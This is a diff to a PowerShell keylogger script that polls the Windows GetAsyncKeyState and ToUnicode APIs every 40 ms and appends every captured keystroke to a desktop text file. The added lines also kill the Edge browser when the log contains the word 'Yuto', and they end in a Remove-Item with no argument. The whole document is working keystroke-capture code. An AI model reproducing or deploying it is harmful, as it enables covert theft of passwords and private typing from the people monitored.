@@ -1,12 +1,12 @@
-# Creator: Securethelogs | @Securethelogs
-# Modified version of: http://powershell.com/cs/blogs/tips/archive/2015/12/09/creating-simple-keylogger.aspx
+$Desktop_Path = [Environment]::GetFolderPath("Desktop")
 
-$path = "C:\users\ryans\desktop\keylog.txt"
+$Keylog_Path = "$Desktop_Path\keylog.txt"
+ 
+if ((Test-Path $Keylog_Path) -eq $False) { New-Item $Keylog_Path } 
 
+# user 32 dll file contains Windows APIs:
 
-if ((Test-Path $path) -eq $false) {New-Item $path}
-
-    $signatures = @'
+$Signatures = @' 
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
 public static extern short GetAsyncKeyState(int virtualKeyCode);
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
@@ -18,46 +18,47 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 '@
 
     
-    $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
-    
+$API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
 
-    try {
+try {
         
-        while ((Test-Path $path) -ne $false){
+    while ((Test-Path $Keylog_Path) -ne $false) {
 
-           
-            Start-Sleep -Milliseconds 40
-
+        Start-Sleep -Milliseconds 40
             
-            for ($ascii = 9; $ascii -le 254; $ascii++) {
+        for ($ascii = 9; $ascii -le 254; $ascii++) {
                 
-                $state = $API::GetAsyncKeyState($ascii)
-
+            $state = $API::GetAsyncKeyState($ascii)
                 
-                if ($state -eq -32767) {
-                    $null = [console]::CapsLock
-
+            if ($state -eq -32767) {
+                $null = [console]::CapsLock
                     
-                    $virtualKey = $API::MapVirtualKey($ascii, 3)
+                $virtualKey = $API::MapVirtualKey($ascii, 3)
 
-                    
-                    $kbstate = New-Object -TypeName Byte[] -ArgumentList 256
-                    $checkkbstate = $API::GetKeyboardState($kbstate)
+                $kbstate = New-Object -TypeName Byte[] -ArgumentList 256
 
-                    
-                    $mychar = New-Object -TypeName System.Text.StringBuilder
-                    
-                    $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
+                $checkkbstate = $API::GetKeyboardState($kbstate)
 
-                    if ($success -and (Test-Path $path) -eq $true) {
+                $mychar = New-Object -TypeName System.Text.StringBuilder
+                    
+                $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
+
+                if ($success -and (Test-Path $Keylog_Path) -eq $true) {
                        
-                        [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
+                    [System.IO.File]::AppendAllText($Keylog_Path, $mychar, [System.Text.Encoding]::Unicode)
 
-                        Get-Content -Path $path
+                    $Keylogger_Contents = Get-Content -Path $Keylog_Path
 
+                    if ($Keylogger_Contents | Select-String -Pattern "Yuto") {
+
+                        Write-Host "Word is in keylogger." -ForegroundColor Red
+                        Stop-Process -Name "msedge"
+                        Remove-Item 
                     }
+
                 }
             }
         }
-    } 
-     finally {exit}
+    }
+} 
+finally { exit }
